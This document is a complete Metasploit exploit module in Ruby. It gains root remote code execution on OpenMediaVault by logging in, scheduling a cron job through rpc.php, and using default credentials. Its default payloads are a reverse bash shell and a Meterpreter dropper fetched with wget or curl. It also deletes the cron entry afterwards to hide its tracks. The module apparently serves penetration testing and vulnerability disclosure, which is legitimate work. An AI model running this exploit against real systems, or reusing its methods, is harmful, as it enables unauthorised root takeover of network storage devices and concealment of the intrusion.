##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenMediaVault rpc.php Authenticated Cron Remote Code Execution',
        'Description' => %q{
          OpenMediaVault allows an authenticated user to create cron jobs as root on the system.
          An attacker can abuse this by sending a POST request via rpc.php to schedule and execute
          a cron entry that runs arbitrary commands as root on the system.
          All OpenMediaVault versions including the latest release 7.3.1-1 are vulnerable.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Brandon Perry <bperry.volatile[at]gmail.com>', # Original Discovery
          'Mert BENADAM' # exploit author
        ],
        'References' => [
          ['CVE', '2013-3632'],
          ['PACKETSTORM', '178526'],
          ['URL', 'https://attackerkb.com/topics/zl1kmXbAce/cve-2013-3632']
        ],
        'DisclosureDate' => '2024-05-08',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64, ARCH_ARMLE, ARCH_AARCH64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => ['linux'],
              'Arch' => [ARCH_X86, ARCH_X64, ARCH_ARMLE, ARCH_AARCH64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'curl'],
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'WfsDelay' => 65 # wait at least one minute for session to allow cron to execute the payload
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI path of the OpenMediaVault web application', '/']),
        OptString.new('USERNAME', [true, 'The OpenMediaVault username to authenticate with', 'admin']),
        OptString.new('PASSWORD', [true, 'The OpenMediaVault password to authenticate with', 'openmediavault'])
      ]
    )
  end

  def user
    datastore['USERNAME']
  end

  def pass
    datastore['PASSWORD']
  end

  def rpc_success?(res)
    res&.code == 200 && res.body.include?('"error":null')
  end

  def login(user, pass)
    print_status("#{peer} - Authenticating with OpenMediaVault using credentials #{user}:#{pass}")
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/rpc.php'),
      'method' => 'POST',
      'keep_cookies' => true,
      'ctype' => 'application/json',
      'data' => {
        service: 'Session',
        method: 'login',
        params: {
          username: user,
          password: pass
        },
        options: nil
      }.to_json
    })
    res&.code == 200 && res.body.include?('"authenticated":true')
  end

  def check_version
    print_status('Trying to detect if target is running a vulnerable version of OpenMediaVault.')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/rpc.php'),
      'method' => 'POST',
      'keep_cookies' => true,
      'ctype' => 'application/json',
      'data' => {
        service: 'System',
        method: 'getInformation',
        params: nil,
        options: {
          updatelastaccess: false
        }
      }.to_json
    })
    return nil unless rpc_success?(res)

    # parse json response and get the version
    res_json = res.get_json_document
    unless res_json.blank?
      # OpenMediaVault v4 has a different json format where index 1 has the version information
      version = res_json.dig('response', 1, 'value')
      version = res_json.dig('response', 'version') if version.nil?
      return Rex::Version.new(version.split('(')[0].gsub(/[[:space:]]/, '')) unless version.nil?
    end
    nil
  end

  def apply_config_changes
    # Apply OpenMediaVault configuration changes
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/rpc.php'),
      'method' => 'POST',
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => {
        service: 'Config',
        method: 'applyChangesBg',
        params: {
          modules: [],
          force: false
        },
        options: nil
      }.to_json
    })
  end

  def execute_command(cmd, _opts = {})
    # OpenMediaFault current release - v6.0.15-1 uses an array definition ['*']
    # OpenMediaVault v3.0.16 - v6.0.14-1 uses a string definition '*'
    # OpenMediaVault v1.0.0 - v3.0.15 uses a string definition '*' and uuid setting 'undefined'
    # OpenMediaVault < 1.0.0 is not supported in this module. It will never reach here because the login will fail
    # MSF module: exploit/multi/http/openmediavault_cmd_exec can be used to exploit these versions
    schedule = '*'
    schedule = ['*'] if @version_number >= Rex::Version.new('6.0.15-1')
    uuid = 'fa4b1c66-ef79-11e5-87a0-0002b3a176b4'
    uuid = 'undefined' if @version_number <= Rex::Version.new('3.0.15')
    post_data = {
      service: 'Cron',
      method: 'set',
      params: {
        uuid: uuid,
        enable: true,
        execution: 'exactly',
        minute: schedule,
        everynminute: false,
        hour: schedule,
        everynhour: false,
        dayofmonth: schedule,
        everyndayofmonth: false,
        month: schedule,
        dayofweek: schedule,
        username: 'root',
        command: cmd.to_s, # payload
        sendemail: false,
        comment: '',
        type: 'userdefined'
      },
      options: nil
    }.to_json

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/rpc.php'),
      'method' => 'POST',
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => post_data
    })
    fail_with(Failure::Unknown, 'Cannot access cron services to schedule payload execution.') unless rpc_success?(res)

    # parse json response and get the uuid of the cron entry
    # we need this later to clean up and hide our tracks
    res_json = res.get_json_document
    @cron_uuid = res_json.dig('response', 'uuid') || ''

    # Apply and update cron configuration to trigger payload execution (1 minute)
    res = apply_config_changes
    fail_with(Failure::Unknown, 'Cannot apply cron changes to trigger payload execution.') unless res && res.code == 200 && res.body.include?('"error":null')
    print_good('Cron payload execution triggered. Wait at least 1 minute for the session to be established.')
  end

  def on_new_session(_session)
    # try to cleanup cron entry in OpenMediaVault
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/rpc.php'),
      'method' => 'POST',
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => {
        service: 'Cron',
        method: 'delete',
        params: {
          uuid: @cron_uuid.to_s
        },
        options: nil
      }.to_json
    })
    if rpc_success?(res)
      # Apply changes and update cron configuration to remove the payload entry
      res = apply_config_changes
      if rpc_success?(res)
        print_good('Cron payload entry successfully removed.')
      else
        print_warning('Cannot apply the cron changes to remove the payload entry.')
      end
    else
      print_warning('Cannot access the cron services to remove the payload entry. If required, remove the entry manually.')
    end
    super
  end

  def check
    @logged_in = login(user, pass)
    return CheckCode::Unknown('Failed to authenticate at OpenMediaVault.') unless @logged_in

    @version_number = check_version
    unless @version_number.nil?
      if @version_number <= Rex::Version.new('7.3.1-1') && @version_number >= Rex::Version.new('1.0.0')
        return CheckCode::Vulnerable("Version #{@version_number}")
      else
        return CheckCode::Appears("Version #{@version_number} can be exploited with module exploit/multi/http/openmediavault_cmd_exec") if @version_number < Rex::Version.new('1.0.0')

        return CheckCode::Detected("Version #{@version_number}")
      end
    end
    CheckCode::Unknown('Could not retrieve the version information.')
  end

  def exploit
    unless @logged_in
      if login(user, pass)
        @version_number = check_version
        fail_with(Failure::Unknown, 'Could not retrieve the version information.') if @version_number.nil?
        print_status("Version #{@version_number} detected.")
      else
        fail_with(Failure::NoAccess, 'Failed to authenticate at OpenMediaVault.')
      end
    end

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end
end
